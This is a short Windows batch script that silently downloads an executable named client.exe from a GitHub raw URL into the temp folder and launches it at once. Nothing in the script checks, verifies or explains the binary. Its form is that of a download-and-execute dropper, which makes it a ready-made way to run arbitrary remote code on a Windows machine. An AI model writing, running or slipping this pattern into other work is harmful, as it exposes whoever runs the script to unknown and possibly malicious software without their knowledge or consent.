@echo off
set "EXE_URL=https://raw.githubusercontent.com/Maximus16adrianu/arduinotest/main/client.exe"
set "EXE_PATH=%temp%\client.exe"
powershell -Command "& {Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_PATH%'}"
start "" "%EXE_PATH%"
exit
